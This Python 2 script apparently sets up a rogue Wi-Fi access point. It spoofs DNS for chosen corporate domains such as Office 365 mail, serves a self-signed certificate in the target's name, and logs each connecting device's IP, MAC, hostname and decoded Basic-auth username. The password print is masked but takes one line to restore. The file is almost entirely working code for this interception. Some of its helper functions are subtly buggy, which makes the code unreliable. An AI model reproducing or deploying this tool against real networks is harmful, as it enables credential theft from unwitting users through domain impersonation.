from argparse import ArgumentParser
from time import sleep
import subprocess
from subprocess import Popen, PIPE, STDOUT
import signal
import os
import threading
import BaseHTTPServer
import datetime
from SimpleHTTPServer import SimpleHTTPRequestHandler
import sys
import base64
import ssl
import SocketServer

clients = []
macs = []
CERTFILE_PATH = "./cert.pem"
hostapd = ""
dnsmasq = ""

class AuthHandler(SimpleHTTPRequestHandler):

    def do_OPTIONS(self):
        timestamp = datetime.datetime.now().strftime("%B %d %Y %I:%M %p")

        print "[+] Got OPTIONS request at " + timestamp
        print "\t IP: " + self.client_address[0]
        print "\t MAC: " + ip_to_mac(self.client_address[0])
        print "\t Hostname: " + ip_to_hostname(self.client_address[0])
        print "\t User-Agent: " + str(self.headers.getheader('User-Agent'))
        print "\t Host: " + str(self.headers.getheader('Host'))

        basic_auth = self.headers.getheader('Authorization')

        if basic_auth is not None:
            auth_decode = base64.b64decode(basic_auth.split(' ')[1])
            print "\t Username: " + auth_decode.split(":")[0]
            #print "\t Password: " + auth_decode.split(":")[1]
            print "\t Password: ***********"

        blacklist_mac(ip_to_mac(self.client_address[0]))

    def do_POST(self):
        timestamp = datetime.datetime.now().strftime("%B %d %Y %I:%M %p")

        print "[+] Got POST request at " + timestamp
        print "\t IP: " + self.client_address[0]
        print "\t MAC: " + ip_to_mac(self.client_address[0])
        print "\t Hostname: " + ip_to_hostname(self.client_address[0])
        print "\t User-Agent: " + str(self.headers.getheader('User-Agent'))
        print "\t Host: " + str(self.headers.getheader('Host'))

        basic_auth = self.headers.getheader('Authorization')

        if basic_auth is not None:
            auth_decode = base64.b64decode(basic_auth.split(' ')[1])
            print "\t Username: " + auth_decode.split(":")[0]
            #print "\t Password: " + auth_decode.split(":")[1]
            print "\t Password: ***********"

        blacklist_mac(ip_to_mac(self.client_address[0]))

    def do_HEAD(self):
        timestamp = datetime.datetime.now().strftime("%B %d %Y %I:%M %p")

        print "[+] Got HEAD request at " + timestamp
        print "\t IP: " + self.client_address[0]
        print "\t MAC: " + ip_to_mac(self.client_address[0])
        print "\t Hostname: " + ip_to_hostname(self.client_address[0])
        print "\t User-Agent: " + str(self.headers.getheader('User-Agent'))
        print "\t Host: " + str(self.headers.getheader('Host'))

        basic_auth = self.headers.getheader('Authorization')

        if basic_auth is not None:
            auth_decode = base64.b64decode(basic_auth.split(' ')[1])
            print "\t Username: " + auth_decode.split(":")[0]
            #print "\t Password: " + auth_decode.split(":")[1]
            print "\t Password: ***********"

        blacklist_mac(ip_to_mac(self.client_address[0]))

    def do_GET(self):
        timestamp = datetime.datetime.now().strftime("%B %d %Y %I:%M %p")

        print "[+] Got GET request at " + timestamp
        print "\t IP: " + self.client_address[0]
        print "\t MAC: " + ip_to_mac(self.client_address[0])
        print "\t Hostname: " + ip_to_hostname(self.client_address[0])
        print "\t User-Agent: " + str(self.headers.getheader('User-Agent'))
        print "\t Host: " + str(self.headers.getheader('Host'))

        basic_auth = self.headers.getheader('Authorization')

        if basic_auth is not None:
            auth_decode = base64.b64decode(basic_auth.split(' ')[1])
            print "\t Username: " + auth_decode.split(":")[0]
            #print "\t Password: " + auth_decode.split(":")[1]
            print "\t Password: ***********"

        blacklist_mac(ip_to_mac(self.client_address[0]))

def serve_https(HandlerClass = AuthHandler,
         ServerClass = BaseHTTPServer.HTTPServer):
    httpd = SocketServer.TCPServer(("", 443), HandlerClass)
    httpd.socket = ssl.wrap_socket (httpd.socket, certfile=CERTFILE_PATH, server_side=True)

    sa = httpd.socket.getsockname()
    print "[+] Serving HTTPS on", sa[0], "port", sa[1]
    httpd.serve_forever()

def generate_hostapd_conf(args):
    with open("hostapd.conf", "w") as file:
        file.write("interface=" + str(args.interface) + "\n")
        file.write("channel=1\n")
        file.write("ssid=" + str(args.ssid) + "\n")
        file.write("wpa=0\n")
        file.write("auth_algs=1\n")
        file.write("macaddr_acl=1\n")
        file.write("accept_mac_file=" + str(os.getcwd()) + "/" + str(args.maclist) + "\n")

def generate_dnsmasq_hosts(args):
    with open("dnsmasq.hosts", "w") as file:
        for entry in str(args.domain).split(','):
            file.write("10.0.0.1  " + str(entry + "\n"))

def generate_dnsmasq_conf(args):
    with open("dnsmasq.conf", "w") as file:
        file.write("interface=" + str(args.interface) + "\n")
        file.write("dhcp-range=10.0.0.10,10.0.0.100,8h\n")
        file.write("dhcp-option=3,10.0.0.1\n")
        file.write("dhcp-option=6,10.0.0.1\n")
        file.write("server=8.8.8.8\n")
        file.write("log-queries\n")
        file.write("log-dhcp\n")
        file.write("addn-hosts=" + str(os.getcwd()) + "/dnsmasq.hosts" + "\n")
        file.write("dhcp-leasefile=" + str(os.getcwd()) + "/dhcp.leases" + "\n")
        file.write("log-facility=" + str(os.getcwd()) + "/dnsmasq.log" + "\n")

def generate_ssl_conf(args):
    with open("ssl.conf", "w") as file:
        file.write("[req]\n")
        file.write("prompt = no\n")
        file.write("distinguished_name = req_distinguished_name\n")
        file.write("req_extensions = v3_req\n")
        file.write("[req_distinguished_name]\n")
        file.write("C = US\n")
        file.write("ST = California\n")
        file.write("L = Los Angeles\n")
        file.write("O = " + str(args.domain) + "\n")
        file.write("OU = " + str(args.domain) + "\n")
        file.write("CN = " + str(args.domain) + "\n")
        file.write("emailAddress = admin@" + str(args.domain) + "\n")
        file.write("[v3_req]\n")
        file.write("basicConstraints = CA:FALSE\n")
        file.write("keyUsage = nonRepudiation, digitalSignature, keyEncipherment\n")

def connected_clients():
    while True:
        if os.path.exists("./dhcp.leases"):
            with open("./dhcp.leases", "r") as file:
                for line in file.readlines():
                    if (line.split()[1]) not in macs:
                        macs.append(line.split()[1])
                        clients.append({'MAC':line.split()[1],'IP':line.split()[2],'hostname':line.split()[3]})
                        print "[+] Client connected " + str(line.split()[1]) + " " + str(line.split()[2]) + " " + str(line.split()[3])

def hostapd_check_log():
    ''' hostapd runs as a daemon but occasionally fails to start
    the wireless interface. When this happens the hostapd
    process continues to run but the access point will fail.

    Exit status is never set as the process is still running.

    Work around is to check log file for errors starting the
    wireless interface and exit the main thread if it encounters them
    '''
    while True:
        if os.path.exists("./hostapd.log"):
            with open("./hostapd.log", "r") as file:
                for line in file.readlines():
                    if ("No such device" in line or
                        "Unable to setup interface" in line or
                        "wasn't started" in line):

                        print "[!] Hostapd failed to start. Check 'hostapd.log' for details"
                        # Exit out of our script not just our forked process
                        os._exit(1)

def blacklist_mac(mac):
    with open("hostapd.allow", "r") as file:
        lines = file.readlines()
        file.close()

    with open("hostapd.allow", "w") as file:
        for line in lines:
            if line.replace('\n', '') == mac:
                print "[+] Removed MAC " + str(mac) + " from hostapd.allow file"
            else:
                file.write(line)
    # Send SIGHUP to force hostapd configuration refresh without restarting the daemon
    hostapd.send_signal(signal.SIGHUP)

def ip_to_mac(ip):
    for entry in clients:
        if ip == entry["IP"]:
            return entry["MAC"]
        else:
            print "[!] Could not find MAC address for IP:" + ip
            return "null"

def ip_to_hostname(ip):
    for entry in clients:
        if ip == entry["IP"]:
            return entry["hostname"]
        else:
            print "[!] Could not find hostname for IP:" + ip
            return "null"

def generate_ssl_cert():

    if os.path.isfile("./cert.pem"):
        print "[+] Using existing SSL certificate 'cert.pem'"
    else:
        print "[!] No SSL certificate found, generating one..."
        cmd = ["/usr/bin/openssl", "req", "-new", "-x509", "-nodes", "-days", "365", "-config", str(os.getcwd()) + "/ssl.conf", "-keyout", "cert.pem", "-out", "cert.pem"]
        try:
            openssl = subprocess.Popen(cmd)
            openssl.wait()
        except subprocess.CalledProcessError as e:
            print "[!] Error returned while starting openssl. Exiting"
            print e.output
            exit()

def start_dnsmasq():

    print "[+] Starting dnsmasq..."
    # -k = Do not run as daemon
    cmd = ["/usr/sbin/dnsmasq", "-k", "-C", str(os.getcwd()) + "/dnsmasq.conf"]

    # mad hacks again
    global dnsmasq
    dnsmasq = subprocess.Popen(cmd, stdout=None, stderr=subprocess.STDOUT)

def start_hostapd():

    print "[+] Starting hostapd..."
    cmd = ["/usr/sbin/hostapd", str(os.getcwd()) + "/hostapd.conf", "-f", "./hostapd.log"]

    # mad hack
    global hostapd
    hostapd = subprocess.Popen(cmd, stdout=None, stderr=subprocess.STDOUT)

def main():

    parser = ArgumentParser()
    parser.add_argument("-i", "--interface", dest="interface", required=True,
                        help="Wireless interface for access point (should not be managed by Network Manager)")

    parser.add_argument("-s", "--ssid", dest="ssid", required=True,
                        help="SSID for access point (max one SSID for now)")

    parser.add_argument("-c", "--channel", dest="channel",
                        help="Wireless channel for access point")

    parser.add_argument("-m", "--maclist", dest="maclist", required=True,
                        help="File containing allowed MAC addresses to connect (one per line)")

    parser.add_argument("-d", "--domain", dest="domain", required=True,
                        help="Domain name to target (specify a comma separated list for mulitple names e.g 'outlook.office365.com,mail.company.com')")

    args = parser.parse_args()

    # Create our config files
    generate_hostapd_conf(args)
    generate_dnsmasq_conf(args)
    generate_dnsmasq_hosts(args)
    generate_ssl_cert()
    generate_ssl_conf(args)

    #os.system("ifconfig " + str(args.interface) + " down")

    start_dnsmasq()
    start_hostapd()

    web_server_thread = threading.Thread(target=serve_https)
    web_server_thread.daemon = True
    web_server_thread.start()

    connected_clients_log_worker = threading.Thread(target=connected_clients)
    connected_clients_log_worker.daemon = True
    connected_clients_log_worker.start()

    hostapd_log_worker = threading.Thread(target=hostapd_check_log)
    hostapd_log_worker.daemon = True
    hostapd_log_worker.start()

    while True:
        sleep(1)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("[+] Interrupt received, stopping...")
        #clean up
        dnsmasq.kill()
        timestamp = datetime.datetime.now().strftime("_%B_%d_%Y_%I:%M_%p")
        os.rename("./hostapd.log", "hostapd.log" + timestamp)
        os.rename("./dhcp.leases", "dhcp.leases" + timestamp)
        os.rename("./dnsmasq.log", "dnsmasq.log" + timestamp)
        hostapd.kill()
        exit()
